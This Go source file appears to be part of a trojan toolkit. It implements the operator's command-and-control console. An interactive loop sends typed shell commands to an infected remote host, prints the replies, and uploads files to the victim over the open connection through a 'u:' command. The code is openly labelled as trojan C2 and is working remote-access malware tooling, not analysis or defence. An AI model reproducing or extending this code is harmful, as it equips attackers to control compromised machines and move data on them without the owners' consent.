package cc

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
)

// Payload describes the connection with a trojan payload
type Payload struct {
	ID   string
	Addr net.Addr
	Conn net.Conn
}

// Activate starts up a new payload command and control
func (p *Payload) Activate() {
	// Keep listening fot std inputs
	for {
		exit := false
		fmt.Print("<PL:#> ")
		// Read the input from stdin
		reader := bufio.NewReader(os.Stdin)
		text, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[ERROR] reading std input", err)
			continue
		}

		cleanedText := strings.TrimSpace(text)

		// Check commands
		switch {
		case cleanedText == "exit":
			fmt.Println("Exiting trojan")
			exit = true
			break
		case strings.Contains(cleanedText, "u:"):
			filepath := strings.Split(cleanedText, "u:")[1]
			p.sendFile(filepath)
		default:
			p.execCommand(cleanedText)
		}

		// Check if we are exiting the payload
		if exit {
			break
		}
	}
}

func (p *Payload) sendFile(filepath string) {
	file, err := os.Open(strings.TrimSpace(filepath))
	if err != nil {
		fmt.Println("[ERROR] opening file", err)
		return
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println("[ERROR] getting file stat", err)
		return
	}

	// Let the server know we are sending over a file
	p.Conn.Write([]byte("u:"))

	// Send over the file name and size to the server
	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := fillString(fileInfo.Name(), 64)
	fmt.Println("Sending filename and filesize!")
	p.Conn.Write([]byte(fileSize))
	p.Conn.Write([]byte(fileName))

	// Create buffer and send over file
	buffer := make([]byte, BufferSize)
	_, err = io.CopyBuffer(p.Conn, file, buffer)
	if err != nil {
		fmt.Println(err)
		return
	}

	// listen for replies
	msg, err := bufio.NewReader(p.Conn).ReadString('\r')
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Print(msg)
}

func (p *Payload) execCommand(txt string) {
	// send the text to the server
	fmt.Fprintf(p.Conn, txt+"\n\r")
	// listen for replies
	msg, err := bufio.NewReader(p.Conn).ReadString('\r')
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Print(msg)
}

func fillString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
